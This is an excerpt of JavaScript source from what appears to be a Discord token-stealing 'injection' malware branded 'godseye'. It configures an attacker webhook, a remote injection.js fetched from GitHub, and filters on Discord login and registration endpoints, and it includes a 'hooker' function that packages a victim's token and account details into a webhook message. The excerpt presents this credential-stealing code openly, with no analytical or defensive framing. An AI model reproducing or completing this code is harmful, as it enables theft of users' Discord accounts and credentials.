...
const CONFIG = {
    webhook: "%WEBHOOK%",
    injection_url: "https://raw.githubusercontent.com/rkrealizt/discord-injection/main/injection.js",
    filters: {
        urls: [
            '/auth/login',
            '/auth/register',
...
const hooker = async (content, token, account) => {
    ...
    content["username"] = "godseye - cord injection";
    content["avatar_url"] = "https://i.ibb.co/tX0k4VS/openart-image-Dwt-OY-Pl-1730806878411-raw-removebg-1.png";
    ...
    content["embeds"][0]["footer"] = {
        "text": "godseye discord injection - made by nocaob",
        "icon_url": "https://i.ibb.co/tX0k4VS/openart-image-Dwt-OY-Pl-1730806878411-raw-removebg-1.png",
    };
